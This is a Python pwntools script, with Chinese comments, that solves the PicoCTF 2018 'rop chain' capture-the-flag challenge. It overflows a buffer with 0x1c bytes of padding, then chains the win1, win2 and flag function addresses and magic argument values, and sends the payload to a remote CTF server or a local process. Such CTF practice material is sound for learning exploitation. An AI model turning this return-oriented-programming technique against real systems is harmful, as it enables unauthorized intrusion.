'''
@Author       : 白银
@Date         : 2023-04-26 14:29:56
@LastEditors  : 白银
@LastEditTime : 2023-04-26 16:11:17
@FilePath     : /pwn/PicoCTF_2018_rop_chain.py
@Description  : https://buuoj.cn/challenges#picoctf_2018_rop%20chain
@Attention    : 
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *
# from libcfind import *

set_arch = 2  # set_arch中，int，0→amd64，1→arm64，2→i386
pwnfile = './PicoCTF_2018_rop_chain'  # pwnfile， str，二进制文件
if_remote = 1  # if_remote，int，1→远程，别的数字→本地
# 打本地，if_remote改别的数字就可以，最后两个参数随便改

# set_arch = 0
if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

print(context)
# context(log_level='debug', arch='i386', os='linux')
# pwnfile = './pwn1'
elf = ELF(pwnfile)

if if_remote == 1:
    # io = remote("192.168.61.139", 8888)
    # io = remote(remote_addr, remote_port)
    io = remote("node4.buuoj.cn", 25045)
    # libc = ELF('/home/jack/Desktop/libc.so.6')
    if set_arch == 0 or set_arch == 1:
        # libc = elf.libc
        # libc = ELF('/home/jack/Desktop/libc-2.23.so')
        libc = ELF('/home/jack/Desktop/2.27x64libc.so.6')
    else:
        # libc = elf.libc
        # libc = ELF('/home/jack/Desktop/libc-2.23.so')
        libc = ELF('/home/jack/Desktop/2.27x86libc.so.6')
else:
    io = process(pwnfile)
    # 本地用
    # elf = ELF(pwnfile)
    # libc = elf.libc
    # libc = ELF('/home/jack/Desktop/libc-2.23.so')
    libc = ELF('/home/jack/Desktop/2.27x86libc.so.6')
    rop = ROP(pwnfile)
    # 本地调试用
    gdb.attach(io)
    pause()

padding = 0x1c # ida看，s变量的上限和r差多少
win1_addr = 0x80485CB
win2_addr = 0x80485D8
flag_addr = 0x804862B
win2_a1 = 0xBAAAAAAD
flag_a1 = 0xDEADBAAD

payload = flat(['a' * padding, win1_addr, win2_addr, flag_addr, win2_a1, flag_a1])

io.sendlineafter('Enter your input> ', payload)

io.interactive()
